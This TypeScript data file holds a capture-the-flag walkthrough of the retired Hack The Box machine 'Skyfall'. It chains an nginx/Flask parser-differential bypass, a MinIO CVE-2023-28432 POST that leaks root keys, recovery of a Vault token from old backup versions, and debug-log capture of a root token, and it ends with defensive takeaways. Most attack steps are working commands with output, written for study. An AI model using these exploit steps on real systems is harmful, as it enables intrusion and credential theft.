import type { WalkthroughDoc } from "./types";

export const skyfall: WalkthroughDoc = {
  slug: "skyfall",
  name: "Skyfall",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Insane",
  retired: "Aug 2024",
  ip: "10.10.11.254",
  tags: [
    "nginx/Flask parser differential",
    "ACL bypass",
    "SSRF / metrics",
    "MinIO CVE-2023-28432",
    "HashiCorp Vault SSH OTP",
    "go-fuse memfs",
    "sudo debug-log capture",
  ],
  lede: "A reverse-proxy that disagrees with its backend about what a path *is*, an object store that hands out its own root credentials, a versioned backup that never really deleted its secrets, and a Vault whose unseal helper is a little too chatty in debug mode — chained end to end from a guest login to a root shell.",
  summary: "An nginx/Flask parser differential unlocks a metrics page that leaks MinIO; CVE-2023-28432 discloses its root keys, a versioned backup yields a Vault token, and a chatty sudo unseal binary captured over go-fuse gives up the root Vault token for SSH-OTP root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Sometimes the old ways are the best.” — *Skyfall*" },
        { kind: "p", text: "**Skyfall** is an Insane-rated Linux machine built entirely around trust boundaries that don't line up. Nothing here is a single exploited CVE dropped on an open port — it is a chain in which every layer trusts the layer in front of it to have already normalised, authenticated, or purged something it never actually did. A reverse proxy trusts its ACL. An object store trusts that a `POST` to a bootstrap endpoint is internal-only. A backup bucket trusts that deleting a file removes it. A Vault helper trusts that its debug log lands somewhere private." },
        { kind: "p", text: "The result is a long, coherent story: each secret we recover is exactly the key to the next door. Before we start turning handles, here is the whole route from an unauthenticated scan to `root`." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap: only `22` + `80`",
            "**vhost fuzz** — `demo.skyfall.htb`, `guest:guest`",
            "**parser differential** — `GET /metrics%0a` bypasses the nginx ACL",
            "**metrics leak** — MinIO backend `prd23-s3-backend.skyfall.htb`, version `2023-03-13`",
            "**CVE-2023-28432** — `POST /minio/bootstrap/v1/verify` leaks `MINIO_ROOT_*`",
            "**mc client** — versioned `askyy/home_backup.tar.gz`",
            "**old version** — `.bashrc` holds a Vault token + internal Vault addr",
            "**Vault SSH OTP** — `dev_otp_key_role` → `ssh askyy` → `user.txt`",
            "**sudo** — NOPASSWD `/root/vault/vault-unseal … -d`",
            "**go-fuse memfs** — capture root's `debug.log` → root Vault token",
            "**admin OTP** — `admin_otp_key_role` → `ssh root` → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "Theme & shape", text: "The box models a fictional cloud-storage startup — *Sky Storage* — with a realistic microservice stack: nginx in front, a Flask app, a MinIO object store, and HashiCorp Vault brokering SSH access. Every stage is a plausible production misconfiguration, not a contrived puzzle, which is what earns the Insane rating. Treat leaked hostnames as things to *add to `/etc/hosts` and re-enumerate*, not memorise." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full-range TCP sweep followed by a service scan on what's open returns a deliberately quiet host: SSH and a web server, nothing else." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 10.10.11.254",
            "$ nmap -p22,80 -sCV -oA nmap/skyfall 10.10.11.254",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)",
            "80/tcp open  http    nginx 1.18.0 (Ubuntu)",
            "# http-title: 302 -> http://skyfall.htb",
          ],
        },
        { kind: "p", text: "nginx 302-redirects the raw IP to `skyfall.htb`, so the site won't render until we teach our resolver the name. We seed `/etc/hosts` up front with the base host and the internal vhosts we'll uncover later, so we don't have to keep coming back to this file mid-chain." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.254 skyfall.htb demo.skyfall.htb prd23-s3-backend.skyfall.htb prd23-vault-internal.skyfall.htb' | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "callout", variant: "tip", title: "SSH is not the way in", text: "With only `22` and `80` exposed, the instinct is to hammer SSH — don't. Password and key brute force go nowhere here; the *intended* SSH access arrives much later as **Vault-generated one-time passwords**. Everything actionable lives behind port 80, which is a strong signal that the foothold is a web / vhost problem." },
      ],
    },
    {
      id: "web-enum",
      num: "02",
      title: "Web enumeration — the Sky Storage demo",
      blocks: [
        { kind: "p", text: "`skyfall.htb` is a marketing page for a beta cloud-storage product. Content discovery on the apex is thin, so we pivot to **virtual-host fuzzing** against the `Host` header, filtering out the base response size." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\",
            "      -u http://skyfall.htb -H 'Host: FUZZ.skyfall.htb' -fs <base-size>",
            "--------------------------------",
            "demo                    [Status: 200, Size: ...]",
          ],
        },
        { kind: "p", text: "One hit: `demo.skyfall.htb`, a Python **Flask** application branded *Sky Storage*. It offers a demo login, and the intended low-privilege account is documented right on the box — `guest:guest` — which drops us onto a limited authenticated dashboard." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# log in at http://demo.skyfall.htb with guest:guest -> Sky Storage dashboard",
            "$ feroxbuster -u http://demo.skyfall.htb \\",
            "      -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
            "# /metrics -> 403 Forbidden (nginx location block)",
          ],
        },
        { kind: "callout", variant: "warn", title: "Ignore the storage UI — chase the 403", text: "The guest dashboard's upload/list features are a time sink; there is nothing to exploit there. The real prize is `/metrics`, a Prometheus endpoint that nginx protects with an exact-match `location` block returning **403 Forbidden**. That ACL is the first thing we're going to break." },
      ],
    },
    {
      id: "parser-differential",
      num: "03",
      title: "nginx / Flask parser differential — ACL bypass on /metrics",
      blocks: [
        { kind: "p", text: "The `/metrics` block is a classic reverse-proxy authorization pattern: nginx matches the path and refuses to forward it. The flaw is that **nginx and Flask (Werkzeug) do not agree on what the path actually is.** Werkzeug's routing strips or ignores a handful of control bytes — form feed `\\x0c`, vertical tab `\\x0b`, tab `\\x09`, and a URL-encoded newline `%0a` — when it normalises the request path. nginx does *not* strip those bytes, so it sees a different string that no longer matches the `= /metrics` location and happily proxies the request through. Flask then normalises the byte away and routes it straight to the metrics handler." },
        { kind: "p", text: "In other words: nginx sees `/metrics%0a` (no match → passed through), Flask sees `/metrics` (matched → served). We request the byte the proxy forgot to normalise." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -i http://demo.skyfall.htb/metrics",
            "HTTP/1.1 403 Forbidden        # nginx blocks the exact path",
            "",
            "$ curl -i http://demo.skyfall.htb/metrics%0a",
            "HTTP/1.1 200 OK               # Flask serves the metrics anyway",
            "# equivalent bypasses: /metrics%0c , /metrics%0b , /metrics%09",
          ],
          highlight: [4],
        },
        { kind: "p", text: "The 200 response is a full Prometheus dump. Most of it is uninteresting Go runtime counters — but buried near the bottom are two lines that describe a **MinIO** object store the demo app talks to." },
        {
          kind: "code",
          lang: "text",
          label: "GET /metrics%0a (excerpt)",
          lines: [
            "minio_software_version_info{...,version=\"2023-03-13T19:46:17Z\"} 1",
            "minio_endpoint_url{...} http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster",
          ],
          highlight: [0, 1],
        },
        { kind: "callout", variant: "warn", title: "Test in Burp/curl, not the address bar", text: "A trailing `%0a` is the reliable payload, but many browsers auto-strip trailing whitespace before sending, so the bypass silently fails in the URL bar. Use `curl` or Burp Repeater. And `minio_endpoint_url` sits at the very end of a large dump — `grep` for `minio` or `endpoint` rather than scrolling." },
        { kind: "callout", variant: "key", title: "Recovered", text: "An internal backend vhost `prd23-s3-backend.skyfall.htb` running **MinIO version 2023-03-13T19:46:17Z**. Add the host to `/etc/hosts` (we already did) — the metrics page is the *only* way to learn this name; you cannot practically brute-force it." },
      ],
    },
    {
      id: "minio-cve",
      num: "04",
      title: "MinIO CVE-2023-28432 — root credential disclosure",
      blocks: [
        { kind: "p", text: "Browsing `prd23-s3-backend.skyfall.htb` directly returns *“All access to this resource has been disabled”*, and the cluster bootstrap endpoint refuses a `GET`. But the version string we just leaked — `2023-03-13` — lands squarely inside the vulnerable window for **CVE-2023-28432**, a MinIO information-disclosure bug in distributed (cluster) mode." },
        { kind: "p", text: "The bug is almost insultingly simple: the endpoint `/minio/bootstrap/v1/verify` is meant to be an internal node-to-node handshake. Sending a **POST** (rather than the blocked GET) causes MinIO to return its cluster bootstrap JSON — which includes the entire `MinioEnv` block, and that block carries `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` in cleartext." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify | jq .",
            "{",
            "  \"MinioEndpoints\": [ { \"Host\": \"minio-node1:9000\" }, { \"Host\": \"minio-node2:9000\" } ],",
            "  \"MinioEnv\": {",
            "    \"MINIO_BROWSER\": \"off\",",
            "    \"MINIO_PROMETHEUS_AUTH_TYPE\": \"public\",",
            "    \"MINIO_ROOT_USER\": \"5GrE1B2YGGyZzNHZaIww\",",
            "    \"MINIO_ROOT_PASSWORD\": \"GkpjkmiVmpFuL2d3oRx0\"",
            "  }",
            "}",
          ],
          highlight: [7, 8],
        },
        { kind: "callout", variant: "warn", title: "The whole exploit is the HTTP verb", text: "`GET` is blocked, `POST` leaks — that's it. Do it in Burp Repeater (change method) or `curl -X POST`. Note `MINIO_BROWSER=off`: there is **no web console**, so we can't just log into a UI. We'll drive the store with the `mc` CLI (or the `minio` Python SDK) using these keys. The related privilege-escalation bug CVE-2023-28434 is tagged for this box, but the credential disclosure via 28432 is the operative step." },
        { kind: "callout", variant: "key", title: "Recovered", text: "MinIO admin credentials — access key `5GrE1B2YGGyZzNHZaIww`, secret key `GkpjkmiVmpFuL2d3oRx0`. Internal nodes `minio-node1:9000` / `minio-node2:9000`." },
      ],
    },
    {
      id: "minio-bucket",
      num: "05",
      title: "MinIO buckets — the versioned home backup",
      blocks: [
        { kind: "p", text: "Those aren't service-scoped keys; they're the MinIO **root** credentials, so we get full admin over the store. We alias the `mc` client at the backend and enumerate. There's a bucket named after a user — `askyy` — holding a single archive, `home_backup.tar.gz`." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ mc alias set myminio http://prd23-s3-backend.skyfall.htb \\",
            "      5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0",
            "$ mc admin info myminio",
            "$ mc ls myminio",
            "[...] askyy/",
            "$ mc ls myminio/askyy/",
            "[...] home_backup.tar.gz      # latest version looks empty",
          ],
        },
        { kind: "p", text: "The latest version of the archive is deliberately emptied — a beginner concludes the bucket is useless here. But the bucket has **object versioning** enabled, and *deleting* a secret from the current version leaves every prior version intact. We list versions and pull an older one." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ mc ls --recursive --versions myminio/askyy/",
            "# ~three versions: one empty, one with an SSH key, one with the .bashrc we want",
            "$ mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 \\",
            "      myminio/askyy/home_backup.tar.gz ./",
            "# alternatively, step back exactly one version from latest:",
            "$ mc undo myminio/askyy/home_backup.tar.gz && mc cp myminio/askyy/home_backup.tar.gz .",
            "$ tar -xvzf home_backup.tar.gz",
            "$ cat home/askyy/.bashrc",
          ],
        },
        { kind: "callout", variant: "warn", title: "Enumerate versions or you'll miss everything", text: "There are roughly three versions of the archive: one empty, one containing a **passphrase-protected SSH key that does not crack** (a red herring — don't burn hours on it), and the one you want, whose `.bashrc` carries the Vault environment. `mc undo` exactly once from latest lands you on the token version; if the versioning flags misbehave, the `minio` Python SDK's `list_objects(..., include_version=True)` does the same job." },
      ],
    },
    {
      id: "vault-token",
      num: "06",
      title: "A Vault token in .bashrc",
      blocks: [
        { kind: "p", text: "The recovered `.bashrc` is where a tired operator left something they shouldn't: an exported HashiCorp **Vault token** and the internal Vault API address. Backups are crown jewels precisely because they capture these moments." },
        {
          kind: "code",
          lang: "bash",
          label: "home/askyy/.bashrc (excerpt)",
          lines: [
            "export VAULT_API_ADDR='http://prd23-vault-internal.skyfall.htb'",
            "export VAULT_TOKEN='hvs.CAESIJlU····························' # redacted",
          ],
          highlight: [0, 1],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Internal Vault address `prd23-vault-internal.skyfall.htb` and an `askyy` Vault token (`hvs.CAESIJlU…` — redacted). This token is our authenticated session against Vault — the pivot to a shell." },
      ],
    },
    {
      id: "foothold",
      num: "07",
      title: "Foothold — Vault SSH OTP as askyy",
      blocks: [
        { kind: "p", text: "We point the `vault` CLI at the internal address and authenticate with the recovered token. Skyfall uses Vault's **SSH secrets engine in One-Time-Password (OTP) mode** to broker interactive logins — instead of static keys, a client asks Vault for a short-lived password, and a PAM helper on the target validates it against Vault." },
        { kind: "p", text: "There are two roles. `dev_otp_key_role` is authorised for our token and targets the user `askyy`; `admin_otp_key_role` targets `root` and is *denied* to this token. We request an OTP for the role we're allowed, and it becomes our SSH password." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ export VAULT_ADDR='http://prd23-vault-internal.skyfall.htb'",
            "$ export VAULT_TOKEN='hvs.CAESIJlU····························' # askyy token, redacted",
            "$ vault status",
            "$ vault list ssh/roles",
            "Keys",
            "----",
            "admin_otp_key_role",
            "dev_otp_key_role",
            "# request + login in one step (dev role targets askyy):",
            "$ vault ssh -role dev_otp_key_role -mode otp \\",
            "      -strict-host-key-checking=no askyy@10.10.11.254",
            "# or generate the OTP and paste it as the SSH password manually:",
            "$ vault write ssh/creds/dev_otp_key_role ip=10.10.11.254",
            "$ ssh askyy@10.10.11.254        # password = the OTP 'key' returned above",
          ],
        },
        { kind: "callout", variant: "warn", title: "VAULT_ADDR, not VAULT_API_ADDR", text: "The `.bashrc` exports `VAULT_API_ADDR`, which the `vault` binary **does not read** — the CLI wants `VAULT_ADDR`. Set that or every command fails to connect. Also: the OTP is single-use and short-lived, so if SSH is slow, generate a fresh one; `vault ssh` folds request-and-login into a single step to avoid the race." },
      ],
    },
    {
      id: "user",
      num: "08",
      title: "user.txt",
      blocks: [
        {
          kind: "code",
          lang: "bash",
          lines: [
            "askyy@skyfall:~$ id",
            "uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)",
            "askyy@skyfall:~$ cat /home/askyy/user.txt",
            "76a8fc64····························",
          ],
          highlight: [3],
        },
        { kind: "p", text: "A foothold, nothing more — `askyy` is an ordinary user. The privilege escalation hinges on the *same* Vault machinery that let us in: the `admin_otp_key_role` we were just denied. To reach it we need a token with more policy, and the box hands us one through a sudo rule." },
      ],
    },
    {
      id: "sudo-recon",
      num: "09",
      title: "Privesc recon — a chatty unseal helper",
      blocks: [
        { kind: "p", text: "`askyy` can run one thing as root without a password: Vault's auto-unseal helper." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "askyy@skyfall:~$ sudo -l",
            "User askyy may run the following commands on skyfall:",
            "    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml",
          ],
          highlight: [2],
        },
        { kind: "p", text: "`vault-unseal` reads `/etc/vault-unseal.yaml` — a root-only file that necessarily contains the Vault **unseal keys and root token**, since that's what auto-unseal needs to submit. We can't read the config, and we can't change the fixed command line. But the binary supports a **debug flag** (`-d` / `-vd`), and in debug mode it writes a `debug.log` into the *current working directory* containing exactly the secrets it parsed — including the root token." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "askyy@skyfall:~$ /root/vault/vault-unseal --help",
            "# -c string   config file",
            "# -d          write verbose debug output to ./debug.log",
            "# -v          verbose",
          ],
        },
        { kind: "callout", variant: "warn", title: "The file is written as root — that's the whole problem", text: "The sudo rule pins the config path, but nothing pins *where* `debug.log` lands: it's relative to our CWD. The catch is that root creates it, so a freshly-created `debug.log` is owned by `root` and unreadable by `askyy`. We need root's process to write those secret bytes into a location whose contents we can read anyway. That's a job for a filesystem we control." },
      ],
    },
    {
      id: "fuse-capture",
      num: "10",
      title: "Capturing the debug log over go-fuse",
      blocks: [
        { kind: "epigraph", text: "“If root will write my file for me, I'll just own the filesystem underneath it.”" },
        { kind: "p", text: "The intended technique is a **FUSE** filesystem. FUSE lets an unprivileged user implement a filesystem in userspace — and crucially, *we* see every read and write regardless of the on-mount ownership root stamps on the file. If root writes `debug.log` into a directory backed by our own FUSE server, we read the bytes straight out of our backing store. We build a modified copy of go-fuse's `memfs` example with `MountOptions{AllowOther: true}` so root's process is permitted to traverse into our mount, then run the sudo command from inside it." },
        {
          kind: "code",
          lang: "go",
          label: "go — memfs mount options (modified)",
          lines: [
            "server, err := fs.Mount(mountpoint, root, &fs.Options{",
            "    MountOptions: fuse.MountOptions{",
            "        AllowOther: true,   // let root's process enter our mount",
            "        Debug:      false,",
            "    },",
            "})",
          ],
          highlight: [3],
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "askyy@skyfall:~$ ./memfs /dev/shm/mnt &        # user-controlled FUSE mount",
            "askyy@skyfall:~$ cd /dev/shm/mnt",
            "askyy@skyfall:/dev/shm/mnt$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd",
            "askyy@skyfall:/dev/shm/mnt$ cat /dev/shm/mnt/debug.log | grep -i 'hvs\\.'",
            "[debug] parsed root token: hvs.I0ewVs····················  # redacted",
            "[debug] unseal keys: [ ... ]",
          ],
          highlight: [4],
        },
        { kind: "callout", variant: "tip", title: "The unintended one-liner", text: "There's a faster shortcut that skips FUSE entirely: pre-create the file yourself. `touch ~/debug.log` first, then run the sudo command from `~`. Because the file already exists and is owned by `askyy`, root's process opens it for **append** rather than creating a new root-owned file — so we can read what root just wrote. `cd ~ ; touch debug.log ; sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d ; cat ~/debug.log`." },
        { kind: "callout", variant: "warn", title: "FUSE gotchas", text: "`AllowOther` requires `user_allow_other` in `/etc/fuse.conf` — it's present on this box, or the mount errors out. And remember the log path is **relative to CWD**, so you must `cd` into the controlled directory before invoking sudo, or root writes `debug.log` somewhere you don't own. Grep the verbose output for `hvs.` — the token is buried among YAML-parsing noise." },
        { kind: "callout", variant: "key", title: "Recovered", text: "The **root Vault token** (`hvs.I0ewVs…` — redacted), plus the cluster's unseal keys. This token carries the policy that the earlier `askyy` token lacked — the one that authorises `admin_otp_key_role`." },
      ],
    },
    {
      id: "root",
      num: "11",
      title: "root.txt — admin OTP with the root token",
      blocks: [
        { kind: "p", text: "The privesc closes the loop cleanly. We swap `VAULT_TOKEN` for the recovered root token, confirm it has root policy, and request an SSH OTP for the previously-forbidden `admin_otp_key_role` — which *is* authorised to target `root`. The OTP becomes our SSH password one last time." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ export VAULT_ADDR='http://prd23-vault-internal.skyfall.htb'",
            "$ export VAULT_TOKEN='hvs.I0ewVs····················' # root token, redacted",
            "$ vault token lookup            # confirms root policy on this token",
            "$ vault ssh -role admin_otp_key_role -mode otp \\",
            "      -strict-host-key-checking=no root@10.10.11.254",
            "# or: vault write ssh/creds/admin_otp_key_role ip=10.10.11.254 ; ssh root@10.10.11.254",
            "root@skyfall:~# cat /root/root.txt",
            "3f9c2e10····························",
          ],
          highlight: [7],
        },
        { kind: "callout", variant: "warn", title: "Swap the token first", text: "It's the *root* token — not the earlier `askyy` token — that unlocks `admin_otp_key_role`; forget to re-export `VAULT_TOKEN` and the OTP request is denied. As before the OTP is single-use, so regenerate if the SSH attempt is delayed. (With the root token you could also fully administer or re-seal the Vault, but the admin OTP role is the clean path to `root.txt`.)" },
        { kind: "p", text: "From a `guest:guest` demo login to `root`, every step handed us the exact key to the next. Skyfall down. 🕳️" },
      ],
    },
    {
      id: "defense",
      num: "12",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**A proxy ACL is not authorization.** nginx and Werkzeug normalise control bytes differently, so a `location` block on `/metrics` falls to `%0a`/`%09`/`%0b`/`%0c`. Enforce authz in the application itself and reject or fully normalise control characters at the edge — never rely on the two layers agreeing on what a path is.",
            "**Patch MinIO and stop echoing secrets from endpoints.** Versions before 2023-03-20 leak `MINIO_ROOT_USER`/`PASSWORD` via a `POST` to `/minio/bootstrap/v1/verify` (CVE-2023-28432). Upgrade, rotate anything ever exposed, and don't keep admin secrets in environment variables that a bootstrap endpoint can reflect.",
            "**Object versioning retains deleted secrets.** Emptying the latest version of `home_backup.tar.gz` left the Vault token readable in a prior version. Purge old versions on secret rotation, and never let files that contain tokens (`.bashrc`) get swept into object-store backups in the first place.",
            "**Least-privilege your Vault roles and policies.** A low-value token was one leaked backup away from a role that targets `root`. Scope SSH-OTP roles tightly, separate token policies, and alert on `ssh/creds` requests for privileged roles.",
            "**Don't let privileged tools write attacker-influenced files into attacker-controlled paths.** The debug log wrote unseal keys and the root token into the caller's CWD. Privileged helpers should log only to fixed, root-owned, non-mountable paths — and should never print unseal material at all.",
            "**Harden FUSE.** `user_allow_other` in `/etc/fuse.conf` let an unprivileged user expose a mount that a root process then wrote secrets into. Disable it unless genuinely required, and keep privileged writes off any path a lower-privileged user can back with a userspace filesystem.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "vhost enumeration · reverse-proxy parser-differential ACL bypass · Prometheus metrics recon · MinIO CVE-2023-28432 disclosure · object-version enumeration · HashiCorp Vault SSH-OTP abuse · sudo/GTFO reasoning · go-fuse `AllowOther` file capture · privilege-scoped token pivoting." },
      ],
    },
  ],
};
